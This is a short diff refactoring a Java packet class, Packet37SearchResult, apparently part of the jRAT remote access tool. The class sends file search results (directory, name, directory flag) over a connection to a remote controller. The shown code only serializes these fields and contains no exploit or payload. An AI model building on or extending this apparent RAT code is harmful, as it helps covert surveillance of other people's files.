@@ -1,8 +1,7 @@
 package jrat.module.fs.packets;
 
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
 
 
 public class Packet37SearchResult extends AbstractOutgoingPacket {
@@ -18,10 +17,10 @@ public class Packet37SearchResult extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(dir);
-		sw.writeLine(name);
-		dos.writeBoolean(directory);
+	public void write(Connection con) throws Exception {
+        con.writeLine(dir);
+        con.writeLine(name);
+        con.writeBoolean(directory);
 	}
 
 	@Override
